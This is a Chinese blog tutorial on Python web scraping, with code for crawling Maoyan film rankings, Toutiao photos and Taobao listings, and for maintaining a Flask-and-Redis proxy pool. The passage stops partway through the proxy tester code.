    <content type="html"><![CDATA[<h2 id="0X01-Requests-正则爬取网页数据"><a href="#0X01-Requests-正则爬取网页数据" class="headerlink" title="0X01 Requests+正则爬取网页数据"></a><strong>0X01 Requests+正则爬取网页数据</strong></h2><h3 id="1-分析网页确定思路"><a href="#1-分析网页确定思路" class="headerlink" title="1.分析网页确定思路"></a><strong>1.分析网页确定思路</strong></h3><p>这一节打算爬取猫眼电影的 top 100 的电影信息，我们首先可以访问一下我们需要爬取的网站，看一下我们需要的信息所处的位置和结构如何</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%981_.png" alt="此处输入图片的描述"></p><p>看完以后我们的思路应该就比较清晰了，我们首先使用 requests 库请求单页内容，然后我们使用正则对我们需要的信息进行匹配，然后将我们需要的每一条信息保存成一个JSON 字符串，并将其存入文件当中，然后就是开启循环遍历十页的内容或者采用 Python 多线程的方式提高爬取速度</p><span id="more"></span><h3 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>spider.py</strong></p><pre><code class="hljs">import requestsimport jsonfrom requests.exceptions import RequestExceptionimport refrom multiprocessing import Poolrequests.packages.urllib3.disable_warnings()def get_one_page(url):    try:        headers = &#123;            &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;,        &#125;        res = requests.get(url,headers=headers,verify=False)        if res.status_code == 200:            return res.text        return None    except RequestException:        return Nonedef parse_one_page(html):    pattern = re.compile(&#39;&lt;dd&gt;.*?board-index.*?(\d+)&lt;/i&gt;.*?data-src=&quot;(.*?)&quot;.*?alt=&quot;(\w+)&quot;.*?&quot;star&quot;&gt;&#39;                         &#39;(.*?)&lt;/p&gt;.*?&quot;releasetime&quot;&gt;(.*?)&lt;/p&gt;.*?integer&quot;&gt;(.*?)&lt;/i&gt;.*?fraction&quot;&gt;(\d)&lt;/i&gt;&#39;,re.S)    items = re.findall(pattern,html)    for item in items:        #这里使用 yield 将该函数变成了一个可迭代对象并且每次能返回自己定义好格式的数据        yield &#123;            &#39;index&#39;: item[0],            &#39;image&#39;: item[1],            &#39;name&#39;: item[2],            &#39;actor&#39;:item[3].strip()[3:],            &#39;time&#39;: item[4].strip()[5:],            &#39;score&#39;: item[5]+item[6]        &#125;def write_to_file(content):    with open(&#39;result.txt&#39;,&#39;a&#39;,encoding=&#39;utf-8&#39;) as f:        f.write(json.dumps(content,ensure_ascii=False) + &#39;\n&#39; )def main(offset):    url = &quot;http://maoyan.com/board/4?offset=&quot; + str(offset)    html = get_one_page(url)    for item in parse_one_page(html):        write_to_file(item)if __name__ == &#39;__main__&#39;:    pool = Pool()    pool.map(main,[i*10 for i in range(10)])    </code></pre><h3 id="3-运行效果"><a href="#3-运行效果" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%986.png" alt="此处输入图片的描述"></p><h2 id="0X02-模拟-Ajax-请求抓取今日头条街拍美图"><a href="#0X02-模拟-Ajax-请求抓取今日头条街拍美图" class="headerlink" title="0X02 模拟 Ajax 请求抓取今日头条街拍美图"></a><strong>0X02 模拟 Ajax 请求抓取今日头条街拍美图</strong></h2><h3 id="1-分析网页确定思路-1"><a href="#1-分析网页确定思路-1" class="headerlink" title="1.分析网页确定思路"></a><strong>1.分析网页确定思路</strong></h3><p>首先我们打开头条街拍的页面，我们发现我们看到的详细页链接直接在源代码中并不能找到，于是我们就需要去查看我们的 ajax 请求，看看是不是通过 ajax 加载的，我们可以打开浏览器控制台，我们过滤 XHR 请求有了一些发现，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%982.png" alt="此处输入图片的描述"></p><p>在 xhr 请求中 offset 为 0 的部分，页面中的 data 为 0 的 数据部分清楚地地显示了我们想要查找的详细页的数据，然后随着我们滚动条的下拉，页面会不断发起 xhr 请求，offset 会随之不断的增大，每次增大的数目为 10 ，实际上是通过 ajax 去请求索引页，每次返回的 json 结果中有10条详细页的数据，这样我们就能不断在页面中获取到街拍新闻的信息。</p><p>有了街拍新闻，自然我们还要进入新闻中获取街拍的美图，我们看一下新闻内部的图片是怎么获取的，如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%983_.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%984.png" alt="此处输入图片的描述"></p><p>很明显，街拍真正的图片的 URL 是通过网页中的 js 变量的方式获取的，我们考虑使用 正则 来获取，另外，页面第一个 title 标签里面有该详细页面的名称，我们可以使用 BeautifulSoup 来提取出来</p><p><strong>思路梳理：</strong></p><p>(1)使用 requests 库去去请求网站，并获取索引网页(ajax 请求的 url)返回的 json 代码<br>(2)从索引网页中提取出详细页面的 URL，并进一步抓取详细页的信息<br>(3)通过正则匹配详细页中的图片链接，并将其下载到本地，并将页面信息和图片的 URL 保存到本地的 MongoDB<br>(4)对多个索引页进行循环抓取，并开启多线程的方式提高效率</p><h3 id="2-代码实现-1"><a href="#2-代码实现-1" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>config.py</strong></p><pre><code class="hljs">MONGO_URL = &#39;localhost&#39;MONGO_DB = &#39;toutiao&#39;MONGO_TABLE = &#39;toutiao&#39;GROUP_STATR = 0GROUP_END = 5KEYWORD = &#39;街拍&#39;IMAGE_DIR = &#39;DOWNLOADED&#39;</code></pre><p><strong>spider.py</strong></p><pre><code class="hljs">import requestsimport refrom bs4 import BeautifulSoupfrom urllib.parse import urlencodeimport jsonfrom requests.exceptions import RequestExceptionfrom config import *import pymongoimport osfrom hashlib import md5from multiprocessing import Pool# 声明 mongodb 数据库对象client = pymongo.MongoClient(MONGO_URL)db = client[MONGO_DB]def get_page_index(offset,keyword):    data = &#123;        &#39;aid&#39;: 24,        &#39;app_name&#39;: &#39;web_search&#39;,        &#39;offset&#39;: offset,        &#39;format&#39;: &#39;json&#39;,        &#39;keyword&#39;: keyword,        &#39;autoload&#39;: &#39;true&#39;,        &#39;count&#39;: 20,        &#39;en_qc&#39;: 1,        &#39;cur_tab&#39;: 1,        &#39;from&#39;: &#39;search_tab&#39;,        &#39;pd&#39;: &#39;synthesis&#39;,        &#39;timestamp&#39;: 1556970196243,    &#125;    headers = &#123;        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;,        &#39;Cookie&#39;:&#39;...&#39;    &#125;    url = &#39;https://www.toutiao.com/api/search/content/?&#39; + urlencode(data)    try:        res = requests.get(url,headers=headers)        res.encoding = &#39;utf-8&#39;        if res.status_code == 200:            return res.text        return None    except RequestException:        print(&#39;requests index page error&#39;)        return Nonedef parse_page_index(html):    data = json.loads(html)    if data and &#39;data&#39; in data.keys():        for item in data.get(&#39;data&#39;):            yield item.get(&#39;article_url&#39;)def get_page_detail(url):    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;,        &#39;Cookie&#39;: &#39;...&#39;    &#125;    try:        res = requests.get(url, headers=headers)        res.encoding = &#39;utf-8&#39;        if res.status_code == 200:            return res.text        return None    except RequestException:        #print(&#39;requests detail page error&#39;,url)        return Nonedef parse_page_detail(html,url):    soup = BeautifulSoup(html,&#39;html.parser&#39;)    title = soup.select(&#39;title&#39;)[0].get_text()    pattern = re.compile(&quot;articleInfo: &#123;.*?content: &#39;(.*?);&#39;,&quot;,re.S)    images = re.search(pattern,html)    if images:        images_pattern = re.compile(&quot;&amp;lt;img src&amp;#x3D;&amp;quot;(.*?)&amp;quot; img_width&amp;#x3D;&amp;quot;&quot;)        res = re.findall(images_pattern,images.group(1))        for image_url in res:            dir_name = re.sub(r&#39;[\\\\/:*?|&quot;&lt;&gt; ]&#39;,&#39;&#39;,title)            download_image(image_url,dir_name[:10])        return &#123;            &#39;title&#39;: title,            &#39;url&#39;: url,            &#39;images&#39;: res,        &#125;def save_to_mongo(result):    if db[MONGO_TABLE].insert(result):        print(&quot;成功存储到 mongodb 数据库&quot;,result)        return True    return Falsedef download_image(url,dir_name):    print(&#39;正在下载:&#39;,url)    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&#39;,        &#39;Cookie&#39;: &#39;...&#39;    &#125;    try:        res = requests.get(url, headers=headers)        if res.status_code == 200:            # 存储二进制数据的时候使用content            save_image(dir_name,res.content)        return None    except RequestException:        print(&#39;requests image error&#39;,url)        return Nonedef save_image(dir_name,content):    if not os.path.exists(IMAGE_DIR + &#39;/&#39; + dir_name):        os.makedirs(IMAGE_DIR + &#39;/&#39; + dir_name)    file_path = &#39;&#123;0&#125;\\&#123;1&#125;\\&#123;2&#125;\\&#123;3&#125;.&#123;4&#125;&#39;.format(os.getcwd(),IMAGE_DIR,dir_name,md5(content).hexdigest(),&#39;jpg&#39;)    if not os.path.exists(file_path):        with open(file_path,&#39;wb&#39;) as f:            f.write(content)def main(offset):    html = get_page_index(offset,KEYWORD)    #print(html)    for url in parse_page_index(html):        #print(url)        html = get_page_detail(url)        if html:            result = parse_page_detail(html,url)            if result:                #print(result)                save_to_mongo(result)if __name__ == &#39;__main__&#39;:    groups = [x*20 for x in range(GROUP_STATR,GROUP_END + 1)]    pool = Pool()    pool.map(main,groups)</code></pre><h3 id="3-运行效果-1"><a href="#3-运行效果-1" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%985.png" alt="此处输入图片的描述"></p><h2 id="0X03-使用Selenium模拟浏览器抓取淘宝商品美食信息"><a href="#0X03-使用Selenium模拟浏览器抓取淘宝商品美食信息" class="headerlink" title="0X03 使用Selenium模拟浏览器抓取淘宝商品美食信息"></a><strong>0X03 使用Selenium模拟浏览器抓取淘宝商品美食信息</strong></h2><p>众所周知，淘宝的网页是非常复杂的，我们按照上面的模拟 Ajax 的请求去获取 json 数据并且解析的方式已经不那么好用了，于是我们要祭出我们的终极杀器—-Selenium ,这个库可以调用浏览器驱动或者是 phantomjs 来模拟浏览器的请求，有了它我们就可以通过脚本去驱动浏览器，这样哪些动态加载的数据就不用我们自己去获取了，非常方便。</p><h3 id="1-分析网页确定思路-2"><a href="#1-分析网页确定思路-2" class="headerlink" title="1.分析网页确定思路"></a><strong>1.分析网页确定思路</strong></h3><p>打开淘宝，输入“美食”，回车</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%988.png" alt="此处输入图片的描述"></p><p>我们想要获取网页上加载的图片，但是我们找到页面的原始请求的页面的结果，我们会发现当我们刚一翻就已经出现页尾的代码了，实际上页面的主体还不知道在哪，我尝试翻找了一下 XHR 请求发现依然不是很明显，这种情况下为了减轻我们的抓取负担，我们可以使用 selenium 配合 Chromedriver 去获取加载好的完整页面，然后我们再使用正则去抓取图片，这样就非常轻松容易了。</p><p><strong>思路梳理：</strong></p><p>(1)利用 selenium 库配合chromedriver 请求淘宝并输入“美食”搜索参数，获取商品列表<br>(2)获取页码，并模拟鼠标点击操作获取后面页码的商品信息<br>(3)使用 PyQuery 分析源码，得到商品的详细信息<br>(4)将商品信息存储到 MongoDB 数据库中</p><h3 id="2-代码实现-2"><a href="#2-代码实现-2" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>config.py</strong></p><pre><code class="hljs">MONGO_URL = &#39;localhost&#39;MONGO_DB = &#39;taobao&#39;MONGO_TABLE = &#39;product&#39;</code></pre><p><strong>spider.py</strong></p><pre><code class="hljs">from selenium import webdriverfrom selenium.common.exceptions import TimeoutExceptionfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport refrom pyquery import PyQuery as pqfrom config import *import pymongoclient = pymongo.MongoClient(MONGO_URL)db = client[MONGO_DB]browser = webdriver.Chrome()wait = WebDriverWait(browser, 100)def search():    try:        browser.get(&#39;https://www.taobao.com/&#39;)        # 判断所需的元素是否加载成功(wait until 中会存在判断条件，因此常常用作判断)        input = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#q&quot;))        )        submit = wait.until(            EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;#J_TSearchForm &gt; div.search-button &gt; button&quot;))        )        #输入+点击        input.send_keys(&quot;美食&quot;)        submit.click()        #查看页数是否加载成功        total = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.total&quot;))        )        get_products()        return total.text    except TimeoutException:        return search()def next_page(page_number):    try:        input = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; input&quot;))        )        submit = wait.until(            EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; span.btn.J_Submit&quot;))        )        input.clear()        input.send_keys(page_number)        submit.click()        wait.until(            EC.text_to_be_present_in_element((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; ul &gt; li.item.active &gt; span&quot;),str(page_number))        )        get_products()    except TimeoutException:        next_page(page_number)def get_products():    wait.until(        # 这里的 CSS 是手写的,因为从控制台复制的话只能得到一个 item        EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-itemlist .items .item&quot;))    )    html = browser.page_source    doc = pq(html)    items = doc(&#39;#mainsrp-itemlist .items .item&#39;).items()    for item in items:        product = &#123;            &#39;title&#39;: item.find(&#39;.title&#39;).text(),            &#39;image&#39;: item.find(&#39;.pic .img&#39;).attr(&#39;src&#39;),            &#39;price&#39;: item.find(&#39;.price&#39;).text(),            &#39;deal&#39;: item.find(&#39;.deal-cnt&#39;).text()[:-3],            &#39;shop&#39;: item.find(&#39;.shop&#39;).text(),            &#39;location&#39;:item.find(&#39;.location&#39;).text(),        &#125;        print(product)        save_to_mongo(product)def save_to_mongo(result):    try:        if db[MONGO_TABLE].insert(result):            print(&quot;存储到 MongoDB 成功&quot;,result)    except Exception:        print(&quot;存储到 MongoDB 失败&quot;)def main():    try:        total = int(re.compile(&#39;(\d+)&#39;).search(search()).group(1))        for i in range(2,total + 1):            next_page(i)    except Exception:        print(&#39;出错了&#39;)    finally:        browser.close()if __name__ == &#39;__main__&#39;:    main()</code></pre><h3 id="3-运行效果-2"><a href="#3-运行效果-2" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%989.png" alt="此处输入图片的描述"></p><h3 id="4-存在问题"><a href="#4-存在问题" class="headerlink" title="4.存在问题"></a><strong>4.存在问题</strong></h3><p>事实上这个脚本并不能完全实现自动化，因为由我们 selenium + chromdriver 打开的淘宝在搜索的时候回弹出登录提示框，我们还需要手动去登录一下才能进行下面的爬取工作，听起来似乎不是很要紧，现在登陆一下只要扫描以下二维码就可以了，但是这样我们就没法使用 chrome headless 模式进行静默访问，很是不爽，于是我们还需要对这段代码进行改进。</p><h3 id="5-尝试解决"><a href="#5-尝试解决" class="headerlink" title="5.尝试解决"></a><strong>5.尝试解决</strong></h3><p>对于 headless 问题，我的解决思路是这样的，因为我们想要用二维码登录，那样的话我们必须要求出现界面，但是这个界面的作用仅仅是一个登录，于是我考虑使用两个 driver ，一个专门用来登录，然后将登录后的 cookie 保存起来，存储在文件中，另一个负责爬取数据的 driver 使用 Headless 模式，然后循环读取本地存储好的 cookie 访问网站，这样就很优雅的解决了我们的问题，下面是我改进后的代码：</p><p><strong>spiser.py</strong></p><pre><code class="hljs">import jsonfrom selenium import webdriverfrom selenium.common.exceptions import TimeoutExceptionfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport refrom pyquery import PyQuery as pqfrom config import *import pymongofrom selenium.webdriver.chrome.options import Options# 数据库配置信息client = pymongo.MongoClient(MONGO_URL)db = client[MONGO_DB]# 全局设置options = Options()options.add_argument(&quot;--headless&quot;)browser = webdriver.Chrome(options=options)wait = WebDriverWait(browser, 20)def get_cookie_to_save():    try:        driver = webdriver.Chrome()        driver.get(&#39;https://login.taobao.com/member/login.jhtml&#39;)        # 判断是否已经成功登陆        # 这里需要重新获取页面，因为页面跳转了 driver 无法识别        source = driver.page_source        doc = pq(source)        if(doc(&#39;#J_SiteNavMytaobao &gt; div.site-nav-menu-hd &gt; a &gt; span&#39;) == u&#39;我的淘宝&#39;):            dictCookies = driver.get_cookies()            jsonCookies = json.dumps(dictCookies)            # 登录完成后,将cookies保存到本地文件            with open(&quot;cookies_tao.json&quot;,&quot;w&quot;) as f:                f.write(jsonCookies)    except Exception:        print(&#39;error&#39;)    finally:        driver.close()def get_the_cookie():    browser.get(&#39;https://www.taobao.com/&#39;)    # 删除本地的所有cookie    browser.delete_all_cookies()    # 读取登录时储存到本地的cookie    with open(&quot;cookies_tao.json&quot;, &quot;r&quot;, encoding=&quot;utf8&quot;) as f:        ListCookies = json.loads(f.read())    # 循环遍历添加 cookie    for cookie in ListCookies:        #print(cookie)        browser.add_cookie(cookie)def search():    try:        browser.get(&#39;https://www.taobao.com/&#39;)        # 判断所需的元素是否加载成功(wait until 中会存在判断条件，因此常常用作判断)        input = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#q&quot;))        )        submit = wait.until(            EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;#J_TSearchForm &gt; div.search-button &gt; button&quot;))        )        #输入+点击        input.send_keys(&quot;美食&quot;)        submit.click()        #查看页数是否加载成功        total = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.total&quot;))        )        get_products()        return total.text    except TimeoutException:        return search()def next_page(page_number):    try:        input = wait.until(            EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; input&quot;))        )        submit = wait.until(            EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; span.btn.J_Submit&quot;))        )        input.clear()        input.send_keys(page_number)        submit.click()        wait.until(            EC.text_to_be_present_in_element((By.CSS_SELECTOR, &quot;#mainsrp-pager &gt; div &gt; div &gt; div &gt; ul &gt; li.item.active &gt; span&quot;),str(page_number))        )        get_products()    except TimeoutException:        next_page(page_number)def get_products():    wait.until(        # 这里的 CSS 是手写的,因为从控制台复制的话只能得到一个 item        EC.presence_of_element_located((By.CSS_SELECTOR, &quot;#mainsrp-itemlist .items .item&quot;))    )    html = browser.page_source    doc = pq(html)    items = doc(&#39;#mainsrp-itemlist .items .item&#39;).items()    for item in items:        product = &#123;            &#39;title&#39;: item.find(&#39;.title&#39;).text(),            &#39;image&#39;: item.find(&#39;.pic .img&#39;).attr(&#39;src&#39;),            &#39;price&#39;: item.find(&#39;.price&#39;).text(),            &#39;deal&#39;: item.find(&#39;.deal-cnt&#39;).text()[:-3],            &#39;shop&#39;: item.find(&#39;.shop&#39;).text(),            &#39;location&#39;:item.find(&#39;.location&#39;).text(),        &#125;        print(product)        save_to_mongo(product)def save_to_mongo(result):    try:        if db[MONGO_TABLE].insert(result):            print(&quot;存储到 MongoDB 成功&quot;,result)    except Exception:        print(&quot;存储到 MongoDB 失败&quot;)def main():    try:        get_cookie_to_save()        get_the_cookie()        total = int(re.compile(&#39;(\d+)&#39;).search(search()).group(1))        for i in range(2,total + 1):            next_page(i)    except Exception:        print(&#39;出错了&#39;)    finally:        browser.close()if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="0X04-Flask-Redis-维护代理池"><a href="#0X04-Flask-Redis-维护代理池" class="headerlink" title="0X04 Flask + Redis 维护代理池"></a><strong>0X04 Flask + Redis 维护代理池</strong></h2><h3 id="1-为什么需要维护代理池"><a href="#1-为什么需要维护代理池" class="headerlink" title="1.为什么需要维护代理池"></a><strong>1.为什么需要维护代理池</strong></h3><p>我们知道很多网站都是由反爬虫的机制的，于是我们就需要对我们的 ip 进行伪装，也是因为这个原因，网上也有很多的免费代理 IP 可以使用,但是这些 ip 质量参差不齐，于是我们就需要对其进行进一步的过滤，所以我们需要自己维护一个自己的好用的代理池，这就是我们这一节的目的，我们使用的 Redis 就是用来存储我们的代理 ip 信息的，flask 主要为我们提供一个方便的调用接口</p><h3 id="2-代理池的基本要求"><a href="#2-代理池的基本要求" class="headerlink" title="2.代理池的基本要求"></a><strong>2.代理池的基本要求</strong></h3><p>(1)多占抓取，异步检测<br>(2)定时筛选持续更新<br>(3)提供接口，易于获取</p><h3 id="3-代理池的架构"><a href="#3-代理池的架构" class="headerlink" title="3.代理池的架构"></a><strong>3.代理池的架构</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%9810.png" alt="此处输入图片的描述"></p><h3 id="4-代码实现"><a href="#4-代码实现" class="headerlink" title="4.代码实现"></a><strong>4.代码实现</strong></h3><blockquote><p><strong>注：</strong></p><p>这里的代码实现来源于以下项目地址：<a href="https://github.com/Python3WebSpider/ProxyPool">https://github.com/Python3WebSpider/ProxyPool</a></p></blockquote><h5 id="1-入口文件-run-py"><a href="#1-入口文件-run-py" class="headerlink" title="(1)入口文件 run.py"></a><strong>(1)入口文件 run.py</strong></h5><pre><code class="hljs">import...sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&#39;utf-8&#39;)def main():    try:        # 这里调用了调度器来运行起来整个代理池框架        s = Scheduler()        s.run()    except:        main()if __name__ == &#39;__main__&#39;:    main()</code></pre><h5 id="2-调度中心-scheduler-py"><a href="#2-调度中心-scheduler-py" class="headerlink" title="(2)调度中心 scheduler.py"></a><strong>(2)调度中心 scheduler.py</strong></h5><pre><code class="hljs">import...class Scheduler():    def schedule_tester(self, cycle=TESTER_CYCLE):        &quot;&quot;&quot;        定时测试代理        &quot;&quot;&quot;        tester = Tester()        while True:            print(&#39;测试器开始运行&#39;)            tester.run()            time.sleep(cycle)        def schedule_getter(self, cycle=GETTER_CYCLE):        &quot;&quot;&quot;        定时获取代理        &quot;&quot;&quot;        getter = Getter()        while True:            print(&#39;开始抓取代理&#39;)            getter.run()            time.sleep(cycle)        def schedule_api(self):        &quot;&quot;&quot;        开启API        &quot;&quot;&quot;        app.run(API_HOST, API_PORT)        def run(self):        print(&#39;代理池开始运行&#39;)        #使用多进程对三个重要函数进行调用        if TESTER_ENABLED:            #调用tester 测试 ip 的可用性            tester_process = Process(target=self.schedule_tester)            tester_process.start()                if GETTER_ENABLED:            #调用 getter 函数从网站中爬取代理 ip             getter_process = Process(target=self.schedule_getter)            getter_process.start()                if API_ENABLED:            #调用 api 函数，提供对外的接口并开启对数据库的接口            api_process = Process(target=self.schedule_api)            api_process.start()</code></pre><h5 id="3-代理ip获取"><a href="#3-代理ip获取" class="headerlink" title="(3)代理ip获取"></a><strong>(3)代理ip获取</strong></h5><p><strong>getter.py</strong></p><pre><code class="hljs">import...class Getter():    def __init__(self):        self.redis = RedisClient()        self.crawler = Crawler()        def is_over_threshold(self):        &quot;&quot;&quot;        判断是否达到了代理池限制        &quot;&quot;&quot;        if self.redis.count() &gt;= POOL_UPPER_THRESHOLD:            return True        else:            return False        def run(self):        print(&#39;获取器开始执行&#39;)        if not self.is_over_threshold():            #通过我们元类设置的属性(方法列表和方法个数)循环调用不同的方法获取代理 ip            for callback_label in range(self.crawler.__CrawlFuncCount__):                callback = self.crawler.__CrawlFunc__[callback_label]                # 获取代理                proxies = self.crawler.get_proxies(callback)                sys.stdout.flush()                for proxy in proxies:                    self.redis.add(proxy)</code></pre><p><strong>crawler.py</strong></p><pre><code class="hljs">#定义一个元类来拦截类的创建，给类添加了一个__CrawlFunc__属性记录所有的爬虫方法名#__CrawlFuncCount__属性记录已经设置好的爬虫方法class ProxyMetaclass(type):    def __new__(cls, name, bases, attrs):        count = 0        attrs[&#39;__CrawlFunc__&#39;] = []        for k, v in attrs.items():            if &#39;crawl_&#39; in k:                attrs[&#39;__CrawlFunc__&#39;].append(k)                count += 1        attrs[&#39;__CrawlFuncCount__&#39;] = count        return type.__new__(cls, name, bases, attrs)class Crawler(object, metaclass=ProxyMetaclass):    # get_proxy 根据传入的方法名称，再通eval() 去执行从而对外统一了调用的接口    def get_proxies(self, callback):        proxies = []        for proxy in eval(&quot;self.&#123;&#125;()&quot;.format(callback)):            print(&#39;成功获取到代理&#39;, proxy)            proxies.append(proxy)        return proxies           def crawl_daili66(self, page_count=4):        &quot;&quot;&quot;        获取代理66        :param page_count: 页码        :return: 代理        &quot;&quot;&quot;        start_url = &#39;http://www.66ip.cn/&#123;&#125;.html&#39;        urls = [start_url.format(page) for page in range(1, page_count + 1)]        for url in urls:            print(&#39;Crawling&#39;, url)            html = get_page(url)            if html:                doc = pq(html)                trs = doc(&#39;.containerbox table tr:gt(0)&#39;).items()                for tr in trs:                    ip = tr.find(&#39;td:nth-child(1)&#39;).text()                    port = tr.find(&#39;td:nth-child(2)&#39;).text()                    yield &#39;:&#39;.join([ip, port])    def crawl_ip3366(self):        ...        yield result.replace(&#39; &#39;, &#39;&#39;)        def crawl_kuaidaili(self):        ...</code></pre><p><strong>关键技术解释：</strong></p><p>虽然我在注释中大概把关键的点都说了一下，但是这个技术非常重要，于是我还想再写一下</p><p><strong>(1)解决很多爬虫配合运行的问题</strong></p><p>因为我们的获取代理 ip 的网站有很多，这样我们就需要些很多的爬虫，那么这些爬虫应该怎样被我们调度就成了一个比较重要的问题，我们最好的想法就是每次调用一个网站，每次从这个网站中返回一个代理 ip 存入数据库，那我们第一个想到的应该就是 用 yield 作为每个爬虫的返回值的形式，这样不仅能实现按照我们自定义的统一格式返回的目的，而且还能完美实现我们每次返回一个然后下一次还能接着继续返回的目的</p><p>除此之外，想要配合运行我们还需要一个统一的函数调用接口，这个的实现方法是使用的 callback 回调函数作为我们函数调用的参数，然后传入我们的函数名，并通过 eval() 去执行我们的函数</p><p><strong>(2)解决动态获取方法名和方法个数问题</strong></p><p>这个问题就比较神奇了，也是我们需要学习的重点，这里使用的是 元类 来劫持类的构建并且为其添加对应的属性的方法来解决这个问题，Python 中一切皆对象，元类简单的说就是创建类的对象，我们还是重点再看一下代码</p><pre><code class="hljs">class ProxyMetaclass(type):    def __new__(cls, name, bases, attrs):        count = 0        attrs[&#39;__CrawlFunc__&#39;] = []        for k, v in attrs.items():            if &#39;crawl_&#39; in k:                attrs[&#39;__CrawlFunc__&#39;].append(k)                count += 1        attrs[&#39;__CrawlFuncCount__&#39;] = count        return type.__new__(cls, name, bases, attrs)</code></pre><p><strong>解释</strong></p><p><code>__new__</code>是在<code>__init__</code>之前被调用的特殊方法，它用来创建对象并返回创建后的对象，各个参数说明如下：</p><pre><code class="hljs">  # cls: 当前准备创建的类  # name: 类的名字  # bases: 类的父类集合  # attrs: 类的属性和方法，是一个字典。</code></pre><p>attrs 可以获取到类的所有属性和方法，于是我们只要给我们想要的方法一个统一的命名规范就可以了，在这里的命名规范是方法名前都有 crawl_ 这个字符串，这样我们就能快速对其进行收集并且计数</p><h5 id="4-测试模块-test-py"><a href="#4-测试模块-test-py" class="headerlink" title="(4)测试模块 test.py"></a><strong>(4)测试模块 test.py</strong></h5><pre><code class="hljs">import...class Tester(object):    def __init__(self):        self.redis = RedisClient()    #async 表示使用协程的方式运行该函数    async def test_single_proxy(self, proxy):        &quot;&quot;&quot;        测试单个代理        :param proxy:        :return:        &quot;&quot;&quot;        #定义连接器并取消ssl安全验证        conn = aiohttp.TCPConnector(verify_ssl=False)        #首先我们创建一个session对象        async with aiohttp.ClientSession(connector=conn) as session:            try:                if isinstance(proxy, bytes):                    proxy = proxy.decode(&#39;utf-8&#39;)                real_proxy = &#39;http://&#39; + proxy                print(&#39;正在测试&#39;, proxy)                #使用创建的 session 对象请求具体的网站                async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response:                    if response.status in VALID_STATUS_CODES:                        self.redis.max(proxy)                        print(&#39;代理可用&#39;, proxy)                    else:                        self.redis.decrease(proxy)                        print(&#39;请求响应码不合法 &#39;, response.status, &#39;IP&#39;, proxy)            except (ClientError, aiohttp.client_exceptions.ClientConnectorError, asyncio.TimeoutError, AttributeError):                self.redis.decrease(proxy)                print(&#39;代理请求失败&#39;, proxy)        def run(self):        &quot;&quot;&quot;        测试主函数        :return:        &quot;&quot;&quot;        print(&#39;测试器开始运行&#39;)        try:            count = self.redis.count()            print(&#39;当前剩余&#39;, count, &#39;个代理&#39;)            for i in range(0, count, BATCH_TEST_SIZE):                start = i                stop = min(i + BATCH_TEST_SIZE, count)                print(&#39;正在测试第&#39;, start + 1, &#39;-&#39;, stop, 